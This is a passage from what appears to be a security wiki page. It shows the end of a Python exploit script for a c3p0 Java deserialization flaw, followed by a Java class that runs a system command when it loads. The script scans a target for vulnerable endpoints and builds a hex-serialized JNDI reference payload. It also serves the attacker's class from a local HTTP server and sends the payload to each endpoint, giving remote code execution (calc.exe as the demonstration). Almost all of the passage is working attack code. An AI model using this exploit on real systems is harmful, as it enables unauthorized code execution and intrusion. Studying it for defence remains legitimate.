    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;-l&quot;</span><span class="p">,</span> <span class="s2">&quot;--bind-ip&quot;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s2">&quot;bind_ip&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;HTTP server bind IP. Default 127.0.0.1. It can&#39;t be 0.0.0.0&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">)</span>

    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
    <span class="n">bind_port</span>  <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">bind_port</span><span class="p">)</span>
    <span class="n">bind_ip</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">bind_ip</span>
    <span class="n">target_ip</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">target</span>
    <span class="n">api_url</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">api_url</span>
    <span class="n">endpoints</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">vuln_endpoints</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="n">PAYLOAD_TYPE</span> <span class="o">=</span> <span class="s2">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>
    <span class="n">PAYLOAD_PREFIX</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;{&quot;userOverridesAsString&quot;:&quot;HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400064c69664578707400c8&quot;&quot;&quot;</span>
    <span class="n">PAYLOAD_SUFIX</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;740003466f6f;&quot;}&quot;&quot;&quot;</span>

    <span class="n">INTERNAL</span> <span class="o">=</span> <span class="n">pad</span><span class="p">(</span><span class="s2">&quot;http://</span><span class="si">{}</span><span class="s2">:</span><span class="si">{}</span><span class="s2">/&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">bind_ip</span><span class="p">,</span> <span class="n">bind_port</span><span class="p">),</span> <span class="mi">200</span><span class="p">)</span>

    <span class="n">INTERNALB</span> <span class="o">=</span> <span class="n">INTERNAL</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>

    <span class="n">INTERNALHEX</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">INTERNALB</span><span class="p">)</span>

    <span class="n">PAYLOAD</span> <span class="o">=</span> <span class="n">PAYLOAD_PREFIX</span><span class="o">+</span><span class="n">INTERNALHEX</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="o">+</span><span class="n">PAYLOAD_SUFIX</span>


    <span class="k">try</span><span class="p">:</span>
        <span class="n">log</span><span class="p">(</span><span class="s2">&quot;info&quot;</span><span class="p">,</span> <span class="s2">&quot;Looking for vulnerable endpoints: </span><span class="si">{}</span><span class="s2">/</span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">api_url</span><span class="p">))</span>
        <span class="n">endpoints</span> <span class="o">=</span> <span class="n">find_endpoints</span><span class="p">(</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">api_url</span><span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">endpoints</span><span class="p">:</span>
            <span class="n">log</span><span class="p">(</span><span class="s2">&quot;info&quot;</span><span class="p">,</span> <span class="s2">&quot;Vulnerable endpoints not found!&quot;</span><span class="p">)</span>
            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
        <span class="n">log</span><span class="p">(</span><span class="s2">&quot;error&quot;</span><span class="p">,</span> <span class="s2">&quot;An error occured:&quot;</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">ex</span><span class="p">)</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">server</span> <span class="o">=</span> <span class="n">HTTPServer</span><span class="p">((</span><span class="n">bind_ip</span><span class="p">,</span> <span class="n">bind_port</span><span class="p">),</span> <span class="n">HttpHandler</span><span class="p">)</span>
        <span class="n">log</span><span class="p">(</span><span class="s2">&quot;info&quot;</span><span class="p">,</span> <span class="s2">&quot;Started HTTP server on </span><span class="si">{}</span><span class="s2">:</span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">bind_ip</span><span class="p">,</span> <span class="n">bind_port</span><span class="p">))</span>
        <span class="n">th</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">server</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">)</span>
        <span class="n">th</span><span class="o">.</span><span class="n">daemon</span><span class="o">=</span><span class="kc">True</span>
        <span class="n">th</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>

        <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">endpoints</span><span class="p">:</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="n">do_get</span><span class="p">(</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
            <span class="n">params</span> <span class="o">=</span> <span class="n">find_parameters</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
            <span class="n">url_temp</span> <span class="o">=</span> <span class="n">find_url</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
            <span class="n">vuln_endpoints</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">url_temp</span><span class="p">,</span> <span class="n">params</span><span class="p">))</span>

        <span class="k">for</span> <span class="n">endpoint</span> <span class="ow">in</span> <span class="n">vuln_endpoints</span><span class="p">:</span>
            <span class="n">log</span><span class="p">(</span><span class="s2">&quot;info&quot;</span><span class="p">,</span> <span class="s2">&quot;Probably vulnerable endpoint </span><span class="si">{}</span><span class="s2">.&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">endpoint</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
            <span class="n">op</span> <span class="o">=</span> <span class="n">raw_input</span><span class="p">(</span><span class="s2">&quot;Do you want to test it? Y/N: &quot;</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">op</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">==</span> <span class="s2">&quot;y&quot;</span><span class="p">:</span>
                <span class="n">exploit</span><span class="p">(</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">endpoint</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">endpoint</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">PAYLOAD</span><span class="p">,</span> <span class="n">PAYLOAD_TYPE</span><span class="p">)</span>

        <span class="n">log</span><span class="p">(</span><span class="s2">&quot;info&quot;</span><span class="p">,</span> <span class="s2">&quot;CTRL+C to exit :)&quot;</span><span class="p">)</span>
        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
        <span class="n">log</span><span class="p">(</span><span class="s2">&quot;info&quot;</span><span class="p">,</span> <span class="s2">&quot;Shutting down...&quot;</span><span class="p">)</span>
        <span class="n">server</span><span class="o">.</span><span class="n">socket</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
        <span class="n">log</span><span class="p">(</span><span class="s2">&quot;error&quot;</span><span class="p">,</span> <span class="s2">&quot;An error occured:&quot;</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">ex</span><span class="p">)</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div>

<p><strong>LifExp.java</strong></p>
<div class="codehilite"><pre><span></span><code><span class="nv">public</span><span class="w"> </span><span class="nv">class</span><span class="w"> </span><span class="nv">LifExp</span><span class="w"> </span>{

<span class="nv">static</span><span class="w"> </span>{
<span class="nv">try</span><span class="w"> </span>{
<span class="nv">String</span>[]<span class="w"> </span><span class="nv">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>{<span class="s2">&quot;cmd.exe&quot;</span>,<span class="w"> </span><span class="s2">&quot;/c&quot;</span>,<span class="w"> </span><span class="s2">&quot;calc.exe&quot;</span>}<span class="c1">;</span>
<span class="nv">java</span>.<span class="nv">lang</span>.<span class="nv">Runtime</span>.<span class="nv">getRuntime</span><span class="ss">()</span>.<span class="k">exec</span><span class="ss">(</span><span class="nv">cmd</span><span class="ss">)</span>.<span class="nv">waitFor</span><span class="ss">()</span><span class="c1">;</span>
}<span class="w"> </span><span class="nv">catch</span><span class="w"> </span><span class="ss">(</span><span class="w"> </span><span class="nv">Exception</span><span class="w"> </span><span class="nv">e</span><span class="w"> </span><span class="ss">)</span><span class="w"> </span>{
<span class="nv">e</span>.<span class="nv">printStackTrace</span><span class="ss">()</span><span class="c1">;</span>
}
}
}
</code></pre></div>

<h2 id="_6">参考链接<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://www.cnblogs.com/tr1ple/p/12608731.html">https://www.cnblogs.com/tr1ple/p/12608731.html</a>#NmdGyEkb</p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Likeshop/Likeshop-formimage%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Likeshop/Likeshop-formimage%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="btn btn-xs btn-link">
        Likeshop formimage任意文件上传
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Libssh/CVE-2018-10933/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Libssh/CVE-2018-10933/README.zh-cn/" class="btn btn-xs btn-link">
        libssh 服务端权限认证绕过漏洞（CVE-2018-10933）
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>